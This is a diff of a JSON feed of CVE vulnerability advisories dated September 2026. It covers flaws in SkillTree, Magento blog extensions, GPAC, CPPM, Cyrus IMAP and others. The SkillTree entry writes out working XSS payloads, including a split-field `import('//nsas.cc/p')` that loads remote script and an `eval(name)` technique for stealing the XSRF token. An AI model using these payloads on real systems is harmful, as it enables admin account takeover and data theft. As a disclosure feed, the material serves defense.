@@ -1,145 +1,145 @@
 {
-  "totalResults": 4192,
+  "totalResults": 4236,
   "items": [
     {
-      "id": "CVE-2026-67401",
-      "published": "2026-09-09T16:17:03.883",
-      "description": "A vulnerability in cPanel allows a mail-enabled account to achieve remote code execution as root through SQLi in EmailTrack component",
+      "id": "CVE-2026-54694",
+      "published": "2026-09-09T19:17:28.400",
+      "description": "SkillTree is a micro-learning gamification platform. Prior to version 4.4.2, two independent code flaws combine into a single exploitable attack chain, with three distinct exploitation paths of escalating impact. `StringHighlighter.js` builds an HTML string by interpolating raw `value` substrings directly into a template literal with no HTML entity encoding. `HighlightedValue.vue` renders that string — and all unfiltered plain values — via Vue's `v-html` directive, which sets `innerHTML`. Separately, the account registration endpoint accepts `firstName`, `lastName`, and `nickname` fields and stores them without any HTML sanitization. An attacker self-registers with `firstName = \"<img src=x onerror=alert(1)>\"` (28 characters — within the 30-character field limit) and visits any quiz. The next time an administrator opens the Quiz Runs page the payload executes in their browser. Three attack paths exist with escalating impact. The first is basic cross-site scripting. Any self-contained payload fitting the 30-character limit (e.g. `<img src=x onerror=alert(1)>`, which is 28 chars) fires automatically when the admin navigates to the runs page through normal use. Arbitrary code execution in the admin's browser is confirmed with zero extra steps. The second is remote script loading via `import()`. Using the split-field technique (`lastName = \"<img src=x\"`, `firstName = \"onerror=import('//nsas.cc/p')>\"`), the attacker loads a full JavaScript file from their server. The file has no size limit and can perform any admin action — delete all projects, create backdoor accounts, dump user data, install a keylogger. No phishing required. The only constraint is that the URL must fit in 11 characters (`//nsas.cc/p`). The third is full cross-site request forgery token theft. Using `eval(name)`, the attacker pre-sets `window.name` to a data-theft payload by sending the admin one redirect link first. The session cookie is `HttpOnly` and cannot be read via `document.cookie`; however, the XSRF token is readable and the attacker leverages same-origin execution to call admin APIs from inside the victim's browser, relaying the responses to an external server. No admin interaction beyond routine use is required. Version 4.4.2 contains a patch.",
       "severity": "CRITICAL",
-      "score": 9.9
+      "score": 9.6
     },
     {
-      "id": "CVE-2026-22590",
-      "published": "2026-09-09T16:17:02.387",
-      "description": "eprosima Fast DDS is a C++ implementation of the DDS (Data Distribution Service) standard of the OMG (Object Management Group). Versions prior to 2.6.12, 2.14.6, 3.2.4, 3.3.1, and 3.4.2 have a remotely triggerable Out-of-Bounds Read while processing RTPS `DATA_FRAG` submessages. An attacker can craft a `DATA_FRAG` with a large `sampleSize` but a small actual payload, and set `fragmentsInSubmessage` such that the receiver treats the packet as the LAST fragment**. In this LAST-fragment path, Fast-DDS computes `incoming_length` based on `sampleSize` and calls `memcpy()` without validating `incoming_data.length >= incoming_length`. As a result, `CacheChange_t::add_fragments()` reads past the received UDP datagram buffer and into adjacent heap memory, copying those bytes into the reassembly buffer. In a Discovery Server deployment, the resulting `CacheChange_t` can be relayed to other participants, meaning that a newly joining participant may receive leaked heap memory (e.g., pointer values that could aid ASLR bypass). Versions 2.6.12, 2.14.6, 3.2.4, 3.3.1, and 3.4.2 fix the issue.",
-      "severity": "CRITICAL",
-      "score": 9.1
-    },
-    {
-      "id": "CVE-2026-87823",
-      "published": "2026-09-09T15:17:27.583",
-      "description": "zstd-jni before 1.5.7-14 performs 32-bit signed bounds checks on three direct-ByteBuffer frame-size native methods, allowing out-of-bounds memory reads via negative or overflowing offsets. Attackers can supply negative offset values near Integer.MIN_VALUE to read unmapped memory, causing JVM termination or extracting arbitrary frame size data from unintended memory locations.",
+      "id": "CVE-2026-79322",
+      "published": "2026-09-09T19:17:47.900",
+      "description": "SQL injection in the RelatedProduct block in Mageplaza Blog for Magento 2 (mageplaza/magento-2-blog-extension) through 4.3.2 allows remote unauthenticated attackers to execute arbitrary SQL commands and read arbitrary database contents via the id parameter to /mpblog/post/view.",
       "severity": "HIGH",
-      "score": 8.2
+      "score": 8.6
     },
     {
-      "id": "CVE-2026-87825",
-      "published": "2026-09-09T15:17:27.903",
-      "description": "zstd-jni before 1.5.7-14 contains a use-after-free vulnerability where streams and contexts hold a dictionary's shared lock only during the load call, allowing the dictionary to be closed while still referenced. Attackers can close a dictionary after associating it with a stream or context, causing subsequent read or write operations to access freed native memory, resulting in silent data corruption or JVM crashes.",
+      "id": "CVE-2026-71612",
+      "published": "2026-09-09T20:20:21.587",
+      "description": "Buffer Overflow vulnerability in GPAC c2dee3aff638cd96f9617ac5b17dc2868cd90ef3 allows an attacker to execute arbitrary code via the nhntdmx_process() function. Fixed in fac50e6a12ac27ffabdd5d3080b51afcc44ad8d6.",
       "severity": "HIGH",
-      "score": 7.7
+      "score": 8.4
     },
     {
-      "id": "CVE-2026-87877",
-      "published": "2026-09-09T15:17:28.070",
-      "description": "zstd-jni versions before 1.5.7-14 fail to validate closed state in setDict, setLongMax, setLevel and setRefMultipleDDicts methods of stream classes. Attackers can call these methods on closed streams to write through freed native pointers, corrupting unrelated objects or crashing the JVM.",
+      "id": "CVE-2026-71614",
+      "published": "2026-09-09T20:20:21.870",
+      "description": "An issue in GPAC c2dee3aff638cd96f9617ac5b17dc2868cd90ef3 allows an attacker to execute arbitrary code via the src/media_tools/dvb_mpe.c, descriptorTime_slice_fec_identifier() and gf_m2ts_ipdatagram_reader() components. Fixed in 0e4093392e1f847c90d20e031e893cd942fef938.",
       "severity": "HIGH",
-      "score": 7.7
+      "score": 8.4
     },
     {
-      "id": "CVE-2026-87822",
-      "published": "2026-09-09T15:17:27.427",
-      "description": "t-digest versions 3.1 through 3.3 fail to validate centroid means during deserialization in MergingDigest.fromBytes, allowing attackers to inject NaN values that bypass validation checks. Attackers can craft malicious serialized digests containing NaN centroids that degrade sorting performance from O(n log n) to O(n squared), causing severe processing delays during merge operations.",
+      "id": "CVE-2026-71613",
+      "published": "2026-09-09T20:20:21.747",
+      "description": "Buffer Overflow vulnerability in GPAC c2dee3aff638cd96f9617ac5b17dc2868cd90ef3 allows an attacker to execute arbitrary code via the j2kdec_process() function. Fixed in 9a253a07fd3f6b48022bba74302bf39388dda859.",
       "severity": "HIGH",
-      "score": 7.5
+      "score": 7.8
     },
     {
-      "id": "CVE-2026-87824",
-      "published": "2026-09-09T15:17:27.753",
-      "description": "zstd-jni before 1.5.7-14 fails to validate the samples buffer capacity in Zstd.trainFromBufferDirect, allowing attackers to read past buffer boundaries by supplying oversized per-sample lengths. Attackers can trigger out-of-bounds memory access by providing crafted sample length arrays that cause the native implementation to walk past the buffer allocation, resulting in JVM termination.",
+      "id": "CVE-2026-52482",
+      "published": "2026-09-09T19:17:28.113",
+      "description": "An issue in SJRC F11 SJ-GPS-PRO firmware build 2019-09-17 allows a remote attacker to obtain sensitive information via the inetd service spawns /app/sh_for_telnet",
       "severity": "HIGH",
       "score": 7.5
     },
     {
-      "id": "CVE-2026-22591",
-      "published": "2026-09-09T16:17:02.563",
-      "description": "eprosima Fast DDS is a C++ implementation of the DDS (Data Distribution Service) standard of the OMG (Object Management Group). Prior to versions 2.6.12, 2.14.6, 3.2.4, and 3.4.3, Fast DDS’s implementation of SQL‑based content filtering (DDSSQLFilter) allows any participant in a DDS domain to remotely crash other Fast DDS participants by sending a single crafted SEDP `DATA` submessage whose `PID_CONTENT_FILTER_PROPERTY.filterExpression` contains a deeply nested filter expression. Versions 2.6.12, 2.14.6, 3.2.4, and 3.4.3 fix the issue.",
+      "id": "CVE-2026-79323",
+      "published": "2026-09-09T19:17:48.020",
+      "description": "Information disclosure in the blogComments GraphQL query in Magefan Blog GraphQL for Magento 2 (magefan/module-blog-graph-ql) through 2.2.1 allows remote unauthenticated attackers to obtain blog commenter email addresses and internal customer and admin identifiers via a POST request to /graphql.",
       "severity": "HIGH",
       "score": 7.5
     },
     {
-      "id": "CVE-2026-26212",
-      "published": "2026-09-09T15:17:06.823",
-      "description": "Rara One Click Demo Import plugin for WordPress before 1.3.5 contains an arbitrary file upload vulnerability that allows authenticated attackers with Administrator privileges to upload arbitrary PHP files by passing a false value to wp_handle_upload() that disables WordPress core's file type validation checks across all three file parameters in the process_uploaded_files() function. Attackers can upload a malicious PHP file to the uploads directory and execute it over HTTP to achieve remote code execution in the web server process, with the uploaded file persisting on disk even after plugin deactivation and leaving no media library record to evade standard integrity checks.",
+      "id": "CVE-2026-73786",
+      "published": "2026-09-09T20:20:33.493",
+      "description": "A vulnerability in the web-based management interface of CPPM could allow an unauthenticated remote attacker to conduct a Denial-of-Service (DoS) attack. Successful exploitation could allow an attacker to cause instability and degrade performance of the vulnerable CPPM server.",
+      "severity": "HIGH",
+      "score": 7.5
+    },
+    {
+      "id": "CVE-2026-73769",
+      "published": "2026-09-09T20:20:33.360",
+      "description": "A vulnerability in the web-based management interface of vulnerable CPPM systems could allow an authenticated remote attacker to achieve remote code execution. Successful exploitation could allow an attacker to execute arbitrary commands on the underlying operating system.",
       "severity": "HIGH",
       "score": 7.2
     },
     {
-      "id": "CVE-2026-79617",
-      "published": "2026-09-09T15:17:09.543",
-      "description": "Incorrect Permission Assignment for Critical Resource vulnerability in TÜBİTAK BİLGEM Software Technologies Research Institute Pardus LightDM Greeter allows Exploiting Incorrectly Configured Access Control Security Levels.\n\nThis issue affects Pardus LightDM Greeter: before 0.4.15.",
+      "id": "CVE-2026-73787",
+      "published": "2026-09-09T20:20:33.607",
+      "description": "A vulnerability in the CPPM web interface could allow an authenticated remote attacker to access directory information on a vulnerable system. Successful exploitation could allow an attacker to execute arbitrary commands on the underlying operating system.",
       "severity": "HIGH",
-      "score": 7.1
+      "score": 7.2
     },
     {
-      "id": "CVE-2026-78482",
-      "published": "2026-09-09T15:17:08.763",
-      "description": "Dell SCG 5.0 Appliance versions prior to 5.36.00.16 and Dell SCG 5.0 Application versions prior to 5.36.00.00, contains an Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability. A low privileged attacker with local access could potentially exploit this vulnerability, leading to command execution.",
+      "id": "CVE-2026-38998",
+      "published": "2026-09-09T20:17:22.387",
+      "description": "A use-after-free in the SocketDescriptor::tcpReadHandler1 function (liveMedia/RTPInterface.cpp) of LIVE555 Streaming Media (version 2026.02.26) allows attackers to cause a Denial of Service (DoS) via sending a series of crafted RTSP and HTTP requests to the server.",
+      "severity": "MEDIUM",
+      "score": 6.5
+    },
+    {
+      "id": "CVE-2026-71616",
+      "published": "2026-09-09T20:20:22.003",
+      "description": "An issue in GPAC c2dee3aff638cd96f9617ac5b17dc2868cd90ef3 allows an attacker to cause a denial of service via the function gf_route_media_complete_object(). Fixed in 3c4e6c5b3e0c6fa9b16d55599701a08354538fab.",
+      "severity": "MEDIUM",
+      "score": 6.2
+    },
+    {
+      "id": "CVE-2025-51619",
+      "published": "2026-09-09T19:17:26.563",
+      "description": "A vulnerability in the Thesycon DPC Latency Checker driver (dpc.sys) thru 1.4.0 allows local unprivileged users to cause a denial-of-service (BSOD) condition on Windows systems. The driver exposes an IOCTL interface (0x81772008) that accepts user-controlled input without validating pointers before passing them to kernel APIs. Specifically, it dereferences a user-supplied pointer and uses the resulting value in a call to ExSetTimerResolution, leading to an arbitrary kernel memory access. Exploiting this flaw results in a system crash.",
       "severity": "MEDIUM",
       "score": 5.5
     },
     {
-      "id": "CVE-2026-79941",
-      "published": "2026-09-09T15:17:10.363",
-      "description": "Dell SCG 5.0 Appliance versions prior to 5.36.00.16 and Dell SCG 5.0 Application versions prior to 5.36.00.00, contains an Improper Neutralization of Special Elements used in a Command ('Command Injection') vulnerability. An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to script injection.",
+      "id": "CVE-2026-39020",
+      "published": "2026-09-09T19:17:27.760",
+      "description": "An issue in WIngs3D v.2.4.1 allows a local attacker to cause a denial of service via a crafted Wavefront OBJ file",
       "severity": "MEDIUM",
-      "score": 5.3
+      "score": 5.5
     },
     {
-      "id": "CVE-2026-82530",
-      "published": "2026-09-09T15:17:11.967",
-      "description": "IP2Location Country Blocker plugin for WordPress before 2.45.0 contains an access control bypass vulnerability that allows unauthenticated remote attackers to circumvent IP-based restrictions by forging the X-Real-IP HTTP header. Attackers can set the X-Real-IP header to an allowlisted IP address to bypass page, link, or site-wide access restrictions and access otherwise-blocked resources.",
+      "id": "CVE-2026-61907",
+      "published": "2026-09-09T19:17:28.927",
+      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. JMAP snooze bypasses the destination-mailbox ACL. An authenticated user with insert permissions on another user's snoozed mailbox could cause insertion of mail to that user's inbox, or any other of their mailboxes whose id was known to the user, despite having no insert permissions to the target mailbox.",
       "severity": "MEDIUM",
-      "score": 5.3
+      "score": 4.3
     },
     {
-      "id": "CVE-2026-79690",
-      "published": "2026-09-09T15:17:09.830",
-      "description": "Dell SCG 5.0 Appliance versions prior to 5.36.00.16 and Dell SCG 5.0 Application versions prior to 5.36.00.00, contains an Improper Certificate Validation vulnerability. An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to unauthorized access.",
+      "id": "CVE-2026-61911",
+      "published": "2026-09-09T20:18:36.800",
+      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. There is a Sieve mailbox existence oracle. An authenticated user could install a Sieve script that probed whether another user's private mailbox existed, or read the value of shared mailbox annotations, by observing which fileinto branch fired during LMTP delivery.",
+      "severity": "MEDIUM",
+      "score": 4.3
+    },
+    {
+      "id": "CVE-2026-61915",
+      "published": "2026-09-09T20:18:36.943",
+      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. There is a VPATCH BYPARAM double-free. An authenticated calendar user could crash a Cyrus CalDAV worker with a PATCH containing PATCH-ACTION=\"BYPARAM@...\" against a resource with two or more properties of the matched kind. The memory holding the selector would be freed once on each iteration over the properties.",
+      "severity": "MEDIUM",
+      "score": 4.2
+    },
+    {
+      "id": "CVE-2026-61909",
+      "published": "2026-09-09T20:18:36.523",
+      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. CalDAV/CardDAV multiget bypasses a per-href ACL. An authenticated DAV user with some shared access to another user's calendar or address book could read even unshared events or contacts by including the target hrefs in a calendar-multiget or addressbook-multiget REPORT.",
       "severity": "LOW",
-      "score": 3.7
+      "score": 3.5
     },
     {
-      "id": "CVE-2026-79729",
-      "published": "2026-09-09T15:17:09.967",
-      "description": "Dell SCG 5.0 Appliance versions prior to 5.36.00.16 and Dell SCG 5.0 Application versions prior to 5.36.00.00, contains an Improper Certificate Validation vulnerability. An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to unauthorized access.",
+      "id": "CVE-2026-61910",
+      "published": "2026-09-09T20:18:36.663",
+      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. Mailbox/set let a sharee change a special-use role on shared mailboxes. An authenticated user with maySetKeywords on another user's mailbox could change that mailbox's specialuse annotation. This could allow the sharee to change the shared mailbox to perform the archived, snoozed, or other role, which might cause mail mail to be written to the shared mailbox, sharing more content than intended. (This is likely to be an unusual situation, made more unusual because if the target already has an non-shared mailbox with that role, role duplication suppression will prevent the update.)",
       "severity": "LOW",
-      "score": 3.7
+      "score": 3.5
     },
     {
-      "id": "CVE-2026-79732",
-      "published": "2026-09-09T15:17:10.100",
-      "description": "Dell Secure Connect Gateway (SCG) 5.0 Appliance, versions prior to 5.36.00.xx, contains an Improper Certificate Validation vulnerability. An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to protection mechanism bypass.",
+      "id": "CVE-2026-61908",
+      "published": "2026-09-09T20:18:36.383",
+      "description": "An issue was discovered in Cyrus IMAP before 3.12.4. A JMAP email-header blob ID can reference an out-of-bounds index. An authenticated user could attempt to download a crafted JMAP blob ID of the form H<emailid>-<index>, which could read past the end of the internal blob_headers array during download, exposing adjacent heap memory.",
       "severity": "LOW",
-      "score": 3.7
-    },
-    {
-      "id": "CVE-2026-79736",
-      "published": "2026-09-09T15:17:10.227",
-      "description": "Dell SCG 5.0 Appliance versions prior to 5.36.00.16 and Dell SCG 5.0 Application versions prior to 5.36.00.00, contains an Improper Certificate Validation vulnerability. An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to unauthorized access.",
-      "severity": "LOW",
-      "score": 3.7
-    },
-    {
-      "id": "CVE-2026-83530",
-      "published": "2026-09-09T15:17:12.123",
-      "description": "A user could provide an expression whose string length is longer than the ParserExpressionSizeLimit() configured on the CEL environment, and a memory allocation would occur proportional to the size of the input before the limit would be checked / enforced.",
-      "severity": "UNKNOWN",
-      "score": null
-    },
-    {
-      "id": "CVE-2026-67403",
-      "published": "2026-09-09T16:17:04.030",
-      "description": "Cash Collect contains an improper authorization vulnerability in the Sage AR Automation API. Insufficient tenant-level authorization checks allow authenticated users to access administrative resources belonging to other tenants by specifying a valid non predictable tenant identifier.",
-      "severity": "UNKNOWN",
-      "score": null
-    },
-    {
-      "id": "CVE-2026-68484",
-      "published": "2026-09-09T16:17:04.157",
-      "description": "Cash Collect contains an improper authorization vulnerability in the Sage AR Automation API. Administrative functions do not properly verify user privileges, allowing authenticated low-privileged users to create administrator accounts and obtain elevated privileges.",
-      "severity": "UNKNOWN",
-      "score": null
+      "score": 3.1
     }
   ]
 }
